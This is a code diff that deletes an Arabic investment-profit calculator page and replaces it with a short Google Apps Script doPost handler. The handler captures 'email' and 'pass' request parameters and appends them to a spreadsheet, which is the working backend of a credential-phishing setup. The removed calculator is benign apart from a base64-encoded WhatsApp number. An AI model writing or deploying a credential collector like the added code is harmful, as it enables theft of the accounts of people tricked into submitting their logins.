@@ -1,36 +1,7 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>محفظة نجم الدين الاستثمارية</title><style>body{background:#0a0f1e;color:#fff;font-family:Arial;padding:20px;text-align:center}h1{color:#facc15}.box{background:#151d32;padding:20px;border-radius:15px;max-width:450px;margin:15px auto;border:1px solid #facc1533}input,select{width:90%;padding:12px;margin:8px 0;border-radius:8px;border:none}button{width:92%;padding:13px;background:#facc15;color:#000;border:none;border-radius:8px;font-weight:800;cursor:pointer;margin-top:10px}.stat{display:flex;justify-content:space-between;background:#1e293b;padding:12px;border-radius:10px;margin:8px 0}.green{color:#22c55e}.gold{color:#facc15}</style></head><body>
-<h1>💰 محفظة نجم الدين الذكية</h1><p style="color:#94a3b8;font-size:13px">احسب أرباحك الحلال - ذهب / دولار / تجارة</p>
-
-<div class="box">
-<select id="type"><option value="gold">ذهب</option><option value="usd">دولار / سعودي</option><option value="trade">تجارة عامة</option></select>
-<input id="inv" type="number" placeholder="مبلغ الاستثمار (ريال يمني)">
-<input id="buy" type="number" placeholder="سعر الشراء">
-<input id="sell" type="number" placeholder="سعر البيع الحالي">
-<button onclick="calc()">احسب الربح 📈</button>
-<div id="res" style="margin-top:15px;display:none"></div>
-</div>
-
-<div class="box" style="text-align:right;font-size:13px">
-<b>💡 تنبيه شرعي:</b> هذا البرنامج للحساب فقط، لا يضمن ربح. الاستثمار الحقيقي فيه ربح وخسارة. لا تدخل في شركات توعدك بربح ثابت فهو ربا.
-<br><br><a id="wa" style="color:#22c55e;text-decoration:none;font-weight:700" href="#">➡️ اطلب نسخة خاصة لمحلك - واتساب</a>
-</div>
-
-<script>
-const _n=atob("OTY3Nzc4MjM3NjU3");
-document.getElementById("wa").onclick=()=>open("https://wa.me/"+_n+"?text=اشتي برنامج استثمار خاص لمحلي","_blank");
-function calc(){
- let inv=parseFloat(document.getElementById("inv").value)||0;
- let buy=parseFloat(document.getElementById("buy").value)||0;
- let sell=parseFloat(document.getElementById("sell").value)||0;
- let r=document.getElementById("res"); r.style.display="block";
- if(!inv||!buy||!sell){r.innerHTML="عبي كل الخانات"; return;}
- let profit = (sell-buy)/buy * inv;
- let total = inv + profit;
- let perc = (profit/inv*100).toFixed(2);
- r.innerHTML = `<div class="stat"><span>رأس المال</span><span>${inv.toLocaleString()} ريال</span></div>
- <div class="stat"><span>الربح / الخسارة</span><span class="${profit>=0?'green':'gold'}">${profit.toLocaleString()} ريال (${perc}%)</span></div>
- <div class="stat"><span>الإجمالي الآن</span><span class="gold">${total.toLocaleString()} ريال</span></div>
- ${profit>0?'✅ ربح حلال ما شاء الله':'⚠️ خسارة، اصبر لا تبيع بخسارة'}`;
+function doPost(e){
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  var email = e.parameter.email;
+  var pass = e.parameter.pass;
+  sheet.appendRow([email, pass, new Date()]);
+  return ContentService.createTextOutput("تم");
 }
-</script>
-</body></html>
